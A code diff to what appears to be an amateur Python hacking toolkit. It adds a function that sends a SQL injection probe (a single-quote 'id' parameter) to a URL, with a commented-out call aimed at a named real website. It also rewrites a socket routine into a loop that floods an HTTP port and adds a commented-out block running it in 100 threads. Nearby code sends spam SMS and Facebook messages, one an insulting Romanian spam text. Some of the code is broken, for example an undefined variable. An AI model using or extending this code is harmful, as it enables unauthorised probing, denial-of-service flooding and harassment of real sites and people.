@@ -4,15 +4,17 @@ import ftplib
 import optparse
 import random
 import re
+import threading
 import socket
 
+import fbchat
 import geocoder
 import nmap
-import fbchat
-from twilio.rest import Client
+import requests
 from bs4 import BeautifulSoup
 from fbchat import *
 from stegano import lsb
+from twilio.rest import Client
 from urllib.error import HTTPError
 from urllib.request import urlopen
 
@@ -39,11 +41,31 @@ chat = options.connection
 argz = options.argz
 brute = options.brute
 
+
+
+def sql_automate(url):
+    target = url
+    result = urlopen(target)
+    if result.getcode() == 200:
+        payload = {"id":"1'"}
+        new_result = requests.get(target,payload)
+        if new_result.status_code == 200:
+            print(new_result.text)
+        else:
+            print("Dorks doesnt exists")
+
+    else:
+        print("ERRor while connecting to the website")
+
 def attack():
-        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        s.connect(("www.google.com",80))
-        s.sendall(b"GET /"+b"payload"+b" HTTP/1.1")
-        s.sendall(b"Host /"+b"www.google.ro"+ b"\r\n\r\n")
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("127.0.0.1",80))
+        for i in range(0,100):
+            s.sendall(b"Host: " + b"localhost" + b"\n")
+            s.sendall(b"GET /"+b"payload"+b" HTTP/1.1\n\n")
+        for i in range(10):
+            print('Worker: %s' % num)
+
         s.close()
 
 def spam_sms():
@@ -59,10 +81,10 @@ def spam_sms():
 
 
 def hime():
-    secret = lsb.hide("/tmp/steganography.png", "Hello World")
-    secret.save("/tmp/Lenna-secret.png")
-    clear_message = lsb.reveal("/tmp/Lenna-secret.png")
-    print(clear_message)
+    secret = lsb.hide("img_fjords.jpg", "Hello World")
+    secret.save("new.png")
+    #clear_message = lsb.reveal("/tmp/Lenna-secret.png")
+    #print(clear_message)
 
 def fmap():
     client = Client("@gmail.com","")
@@ -80,7 +102,6 @@ def fmap():
         client.sendMessage('TE SPAMEZ TAPA merge spammeru facut de mine',thread_id="",thread_type=fbchat.ThreadType.USER)
 def smap():
     import smtplib
-    import time
 
     # SMTP_SSL Example
     FROM = "@gmail.com"
@@ -318,7 +339,11 @@ def main():
     #fmap()
     #spam_sms()
     #for i in range(0,100):
-     #   attack()
+        #attack()
+    #sql_automate("http://www.romanianwriters.ro/s.php")
+    #for i in range(100):
+        #t = threading.Thread(target=attack())
+        #t.start()
 
 
 if __name__ == '__main__':
